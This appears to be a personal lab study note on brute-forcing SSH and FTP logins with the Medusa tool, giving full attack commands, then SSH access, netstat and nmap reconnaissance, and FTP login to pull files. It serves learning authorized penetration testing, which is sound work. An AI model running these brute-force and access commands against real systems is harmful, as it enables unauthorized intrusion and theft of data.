# Page

#### Personal Notes on Web Services and Brute-Force Attacks

**Overview of Web Services**

* In cybersecurity, robust authentication mechanisms are crucial for protecting systems.
* Protocols like **Secure Shell (SSH)** and **File Transfer Protocol (FTP)** are commonly used for secure remote access and file management but can be vulnerable to brute-force attacks if weak passwords are employed.

**Understanding SSH and FTP**

* **SSH**: A cryptographic protocol providing secure remote login and command execution. Its encryption makes it more secure than unencrypted protocols like Telnet, but weak passwords can still expose it to brute-force attacks.
* **FTP**: A standard protocol for transferring files, but it transmits data, including credentials, in cleartext, making it susceptible to interception and brute-forcing.

**Kick-off**

* To demonstrate the use of Medusa for brute-forcing, we will target an SSH server. Assuming we know the username (`sshuser`), we can use Medusa to try various password combinations.

**Example Command for SSH Brute-Force**

{% code overflow="wrap" %}
```bash
medusa -h <SERVER_IP> -n <SERVER_PORT> -u sshuser -P 2023-200_most_used_passwords.txt -M ssh -t 3
```
{% endcode %}

* **Components**:
  * `-h <IP>`: Target system's IP address.
  * `-n <PORT>`: Port for the SSH service (usually port 22).
  * `-u sshuser`: Username for the attack.
  * `-P 2023-200_most_used_passwords.txt`: [Wordlist](https://raw.githubusercontent.com/danielmiessler/SecLists/refs/heads/master/Passwords/Common-Credentials/2023-200_most_used_passwords.txt) of common passwords.
  * `-M ssh`: Specifies the SSH module.
  * `-t 3`: Number of parallel login attempts.

**Gaining Access**

* Upon executing the command, Medusa will attempt various passwords and indicate a successful login when the correct password is found.

**Establishing an SSH Connection**

```bash
ssh sshuser@<SERVER_IP> -p <SERVER_PORT>
```

* This command initiates an SSH session, granting access to the remote system's command line.

**Expanding the Attack Surface**

* Once logged in, use `netstat` to identify open ports and services:

```bash
netstat -tulpn | grep LISTEN
```

* This may reveal additional services, such as an FTP server running on port 21.

**Confirming with Nmap**

```bash
nmap localhost
```

* This command scans for open ports and confirms the presence of the FTP service.

**Targeting the FTP Server**

* With the FTP server identified, we can proceed to brute-force its authentication.

**Example Command for FTP Brute-Force**

```bash
medusa -h 127.0.0.1 -u ftpuser -P 2020-200_most_used_passwords.txt -M ftp -t 5
```

* **Components**:
  * `-h 127.0.0.1`: Targets the local system.
  * `-u ftpuser`: Specifies the FTP username.
  * `-M ftp`: Selects the FTP module.
  * `-t 5`: Sets the number of parallel login attempts to 5.

**Accessing System Files**

* Upon successfully cracking the FTP password, establish an FTP connection:

```bash
ftp ftp://ftpuser:<FTPUSER_PASSWORD>@localhost
```

* After logging in, you can list files and download them, potentially gaining access to sensitive system files.

#### Key Takeaways

* Brute-force attacks can exploit weak authentication mechanisms in SSH and FTP.
* Tools like Medusa can automate the process of testing multiple password combinations.
* Always ensure proper authorization before testing systems to avoid legal issues.
